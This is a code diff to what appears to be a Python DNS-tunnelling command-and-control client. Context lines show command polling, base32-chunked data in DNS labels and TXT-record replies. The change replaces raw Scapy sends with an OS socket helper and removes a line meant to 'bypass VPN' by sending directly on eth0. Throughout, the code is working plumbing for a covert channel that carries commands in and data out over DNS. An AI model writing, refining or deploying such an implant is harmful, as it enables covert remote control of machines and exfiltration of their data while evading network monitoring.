@@ -20,12 +20,13 @@ Command query format:
 import base64
 import platform
 import re
+import socket
 import subprocess
 import threading
 import time
 import random
 import string
-from scapy.all import IP, UDP, sr1, conf
+from scapy.all import conf
 from scapy.layers.dns import DNS, DNSQR, DNSRR
 
 
@@ -80,10 +81,8 @@ DNS_SERVER      = ""                    # set in __main__ to the system resolver
 COMMAND_INTERVAL = 10                  # seconds between command polls (10 min)
 CHUNK_SIZE      = 50                    # base32 chars per DNS label (≈31 raw bytes)
 QUERY_DELAY     = 0.5                   # seconds between consecutive chunk queries
-IFACE           = "eth0"               # bypass VPN by sending directly on eth0
 
-conf.verb = 0
-conf.iface = IFACE
+conf.verb = 0  # suppress Scapy output
 
 
 # ---------------------------------------------------------------------------
@@ -110,22 +109,37 @@ def _gen_session() -> str:
 # DNS helpers
 # ---------------------------------------------------------------------------
 
+def _dns_send(qname: str, qtype: str, wait_reply: bool):
+    """
+    Build a DNS query with Scapy, send it via an OS UDP socket (so VPN routing
+    applies), and optionally return the parsed DNS response.
+    Using socket instead of Scapy send/sr1 means the OS routes the packet
+    through whichever interface is correct (physical, TAP, tun, etc.).
+    """
+    pkt = DNS(id=random.randint(0, 65535), rd=1, qd=DNSQR(qname=qname, qtype=qtype))
+    raw = bytes(pkt)
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    sock.settimeout(5)
+    try:
+        sock.sendto(raw, (DNS_SERVER, 53))
+        if not wait_reply:
+            return None
+        data, _ = sock.recvfrom(4096)
+        return DNS(data)
+    except OSError:
+        return None
+    finally:
+        sock.close()
+
+
 def _query_a(qname: str) -> None:
-    """Fire-and-forget DNS A query (response discarded)."""
-    pkt = IP(dst=DNS_SERVER) / UDP(sport=random.randint(1024, 65534), dport=53) / DNS(
-        rd=1,
-        qd=DNSQR(qname=qname, qtype="A"),
-    )
-    conf.iface = IFACE; sr1(pkt, timeout=1, verbose=0)
+    """Fire-and-forget DNS A query (no wait for response)."""
+    _dns_send(qname, "A", wait_reply=False)
 
 
 def _query_txt(qname: str):
-    """Send a DNS TXT query and return the response packet."""
-    pkt = IP(dst=DNS_SERVER) / UDP(sport=random.randint(1024, 65534), dport=53) / DNS(
-        rd=1,
-        qd=DNSQR(qname=qname, qtype="TXT"),
-    )
-    conf.iface = IFACE; return sr1(pkt, timeout=5, verbose=0)
+    """Send a DNS TXT query and return the parsed DNS response, or None."""
+    return _dns_send(qname, "TXT", wait_reply=True)
 
 
 def _extract_txt(resp) -> str | None:
